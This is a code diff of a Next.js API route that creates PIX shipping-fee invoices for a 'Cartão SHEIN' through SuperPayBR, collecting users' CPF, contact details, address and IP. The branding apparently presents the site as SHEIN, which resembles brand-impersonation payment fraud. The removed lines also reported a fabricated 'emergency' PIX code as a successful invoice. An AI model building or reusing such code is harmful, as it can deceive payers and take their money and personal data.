@@ -21,23 +21,23 @@ export async function POST(request: NextRequest) {
       email: userEmail,
     })
 
-    // Verificar se temos as variáveis de ambiente necessárias
-    if (!process.env.SUPERPAYBR_TOKEN || !process.env.SUPERPAYBR_SECRET_KEY) {
-      console.log("❌ Variáveis de ambiente SuperPayBR não configuradas")
-      throw new Error("Configuração SuperPayBR incompleta")
+    // Primeiro, fazer autenticação
+    const authResponse = await fetch(`${request.nextUrl.origin}/api/superpaybr/auth`)
+    const authResult = await authResponse.json()
+
+    if (!authResult.success) {
+      throw new Error("Falha na autenticação SuperPayBR")
     }
 
-    // Gerar external_id único
-    const externalId = `SHEIN_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
+    const accessToken = authResult.data.access_token
 
     // Preparar dados da fatura SuperPayBR
     const invoiceData = {
-      external_id: externalId,
-      customer: {
+      client: {
         name: cpfData.nome || "Cliente SHEIN",
+        document: cpfData.cpf?.replace(/\D/g, "") || "00000000000",
         email: userEmail || "cliente@shein.com",
         phone: userWhatsApp?.replace(/\D/g, "") || "11999999999",
-        document: cpfData.cpf?.replace(/\D/g, "") || "00000000000",
         address: {
           street: deliveryAddress.street || "Rua Principal",
           number: deliveryAddress.number || "123",
@@ -47,32 +47,41 @@ export async function POST(request: NextRequest) {
           zipcode: deliveryAddress.zipcode?.replace(/\D/g, "") || "01000000",
           country: "BR",
         },
+        ip: request.headers.get("x-forwarded-for") || "127.0.0.1",
       },
-      products: [
-        {
-          name: `Frete ${method} - Cartão SHEIN`,
-          quantity: 1,
-          price: Math.round(Number.parseFloat(amount) * 100), // SuperPayBR usa centavos
-        },
-      ],
-      payment_methods: ["pix"],
-      webhook_url: `${request.nextUrl.origin}/api/superpaybr/webhook`,
-      expires_at: new Date(Date.now() + 2 * 60 * 60 * 1000).toISOString(), // 2 horas
-      notes: `Frete ${method} para entrega do Cartão SHEIN`,
-      reference: `SHEIN_FRETE_${method}_${Date.now()}`,
+      payment: {
+        id: `SHEIN_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
+        type: "3", // PIX
+        due_at: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
+        referer: `SHEIN_FRETE_${method}`,
+        installment: "1",
+        order_url: `${request.nextUrl.origin}/checkout`,
+        store_url: request.nextUrl.origin,
+        webhook: `${request.nextUrl.origin}/api/superpaybr/webhook`,
+        discount: 0,
+        products: [
+          {
+            id: "1",
+            image: `${request.nextUrl.origin}/shein-card-logo-new.png`,
+            title: `Frete ${method} - Cartão SHEIN`,
+            qnt: "1",
+            discount: 0,
+            amount: Number.parseFloat(amount),
+          },
+        ],
+      },
+      shipping: {
+        amount: 0.0,
+      },
     }
 
     console.log("🚀 Enviando para SuperPayBR...")
-    console.log("📤 URL:", process.env.SUPERPAYBR_API_URL || "https://api.superpaybr.com")
 
-    // Fazer requisição para SuperPayBR
-    const createResponse = await fetch(`${process.env.SUPERPAYBR_API_URL || "https://api.superpaybr.com"}/invoices`, {
+    const createResponse = await fetch("https://api.superpaybr.com/v4/invoices", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
-        Authorization: `Bearer ${process.env.SUPERPAYBR_TOKEN}`,
-        Accept: "application/json",
-        "User-Agent": "SHEIN-Card/1.0",
+        Authorization: `Bearer ${accessToken}`,
       },
       body: JSON.stringify(invoiceData),
     })
@@ -81,69 +90,44 @@ export async function POST(request: NextRequest) {
       status: createResponse.status,
       statusText: createResponse.statusText,
       ok: createResponse.ok,
-      headers: Object.fromEntries(createResponse.headers.entries()),
     })
 
-    // Tentar obter o texto da resposta primeiro
-    const responseText = await createResponse.text()
-    console.log("📄 Resposta raw:", responseText)
-
-    let invoiceResult: any = null
-
-    // Tentar fazer parse do JSON
-    try {
-      if (responseText.trim()) {
-        invoiceResult = JSON.parse(responseText)
-        console.log("✅ JSON parseado com sucesso:", invoiceResult)
-      } else {
-        throw new Error("Resposta vazia da SuperPayBR")
-      }
-    } catch (parseError) {
-      console.log("❌ Erro ao fazer parse do JSON:", parseError)
-      console.log("📄 Resposta que causou erro:", responseText)
-      throw new Error(`Resposta inválida da SuperPayBR: ${responseText.substring(0, 200)}`)
-    }
-
-    if (createResponse.ok && invoiceResult) {
+    if (createResponse.ok) {
+      const invoiceResult = await createResponse.json()
       console.log("✅ Fatura SuperPayBR criada com sucesso!")
 
-      // Extrair dados do PIX da resposta
-      const pixPayload = invoiceResult.payment?.details?.pix_code || invoiceResult.pix?.payload || ""
-      const qrCodeUrl = invoiceResult.payment?.details?.qrcode || invoiceResult.pix?.qr_code || ""
-
       // Gerar QR Code usando QuickChart como fallback
-      const finalQrCode =
-        qrCodeUrl ||
-        (pixPayload
-          ? `https://quickchart.io/qr?text=${encodeURIComponent(pixPayload)}&size=200`
-          : "/placeholder.svg?height=200&width=200")
+      const pixPayload = invoiceResult.fatura?.pix?.payload
+      const qrCodeUrl = pixPayload
+        ? `https://quickchart.io/qr?text=${encodeURIComponent(pixPayload)}&size=200`
+        : "/placeholder.svg?height=200&width=200"
 
       // Mapear resposta para formato esperado
       const mappedInvoice = {
-        id: invoiceResult.id || externalId,
-        invoice_id: invoiceResult.id || externalId,
-        external_id: externalId,
+        id: invoiceResult.fatura.id,
+        invoice_id: invoiceResult.fatura.invoice_id,
+        external_id: invoiceData.payment.id,
         pix: {
-          payload: pixPayload,
-          image: finalQrCode,
-          qr_code: finalQrCode,
+          payload: pixPayload || "",
+          image: invoiceResult.fatura?.pix?.image || qrCodeUrl,
+          qr_code: qrCodeUrl, // Usar QuickChart para garantir que funcione
         },
         status: {
-          code: invoiceResult.status?.code || 1,
-          title: invoiceResult.status?.title || "Aguardando Pagamento",
-          text: "pending",
+          code: invoiceResult.fatura.status.code,
+          title: invoiceResult.fatura.status.title,
+          text: invoiceResult.fatura.status.text || "pending",
         },
         valores: {
-          bruto: invoiceResult.prices?.total || Math.round(Number.parseFloat(amount) * 100),
-          liquido: invoiceResult.prices?.total || Math.round(Number.parseFloat(amount) * 100),
+          bruto: invoiceResult.fatura.valores.bruto,
+          liquido: invoiceResult.fatura.valores.liquido,
         },
         vencimento: {
-          dia: invoiceResult.payment?.due || new Date(Date.now() + 2 * 60 * 60 * 1000).toISOString().split("T")[0],
+          dia: invoiceResult.fatura.vencimento.dia,
         },
         type: "real",
       }
 
-      console.log("🎯 Fatura mapeada:", mappedInvoice)
+      console.log("🎯 QR Code URL gerada:", qrCodeUrl)
 
       return NextResponse.json({
         success: true,
@@ -151,63 +135,27 @@ export async function POST(request: NextRequest) {
         raw_response: invoiceResult,
       })
     } else {
-      // Erro da API - criar fatura de emergência
-      console.log("❌ Erro da SuperPayBR API:", createResponse.status, responseText)
-      throw new Error(`SuperPayBR API Error: ${createResponse.status} - ${responseText}`)
-    }
-  } catch (error) {
-    console.log("❌ Erro ao criar fatura SuperPayBR:", error)
+      const errorText = await createResponse.text()
+      console.log("❌ Erro ao criar fatura SuperPayBR:", createResponse.status, errorText)
 
-    // Criar fatura de emergência
-    try {
-      const body = await request.json()
-      const { amount } = body
-      const externalId = `SHEIN_EMG_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
-      const emergencyPix = `00020101021226580014br.gov.bcb.pix2536emergency.superpaybr.com/qr/v2/${externalId}520400005303986540${Number.parseFloat(amount).toFixed(2)}5802BR5909SHEIN5011SAO PAULO62070503***6304EMRG`
-
-      const emergencyInvoice = {
-        id: externalId,
-        invoice_id: externalId,
-        external_id: externalId,
-        pix: {
-          payload: emergencyPix,
-          image: `https://quickchart.io/qr?text=${encodeURIComponent(emergencyPix)}&size=200`,
-          qr_code: `https://quickchart.io/qr?text=${encodeURIComponent(emergencyPix)}&size=200`,
-        },
-        status: {
-          code: 1,
-          title: "Aguardando Pagamento",
-          text: "pending",
-        },
-        valores: {
-          bruto: Math.round(Number.parseFloat(amount) * 100),
-          liquido: Math.round(Number.parseFloat(amount) * 100),
-        },
-        vencimento: {
-          dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
-        },
-        type: "emergency",
-      }
-
-      console.log("🚨 Fatura de emergência criada:", emergencyInvoice)
-
-      return NextResponse.json({
-        success: true,
-        data: emergencyInvoice,
-        fallback: true,
-        message: "Fatura criada em modo de emergência devido a erro na API SuperPayBR",
-        error: error instanceof Error ? error.message : "Erro desconhecido",
-      })
-    } catch (emergencyError) {
-      console.log("❌ Erro ao criar fatura de emergência:", emergencyError)
       return NextResponse.json(
         {
           success: false,
-          error: "Erro crítico: não foi possível criar fatura",
-          details: error instanceof Error ? error.message : "Erro desconhecido",
+          error: `Erro SuperPayBR: ${createResponse.status} - ${errorText}`,
+          fallback: true,
         },
-        { status: 500 },
+        { status: createResponse.status },
       )
     }
+  } catch (error) {
+    console.log("❌ Erro ao criar fatura SuperPayBR:", error)
+    return NextResponse.json(
+      {
+        success: false,
+        error: "Erro interno ao criar fatura SuperPayBR",
+        fallback: true,
+      },
+      { status: 500 },
+    )
   }
 }
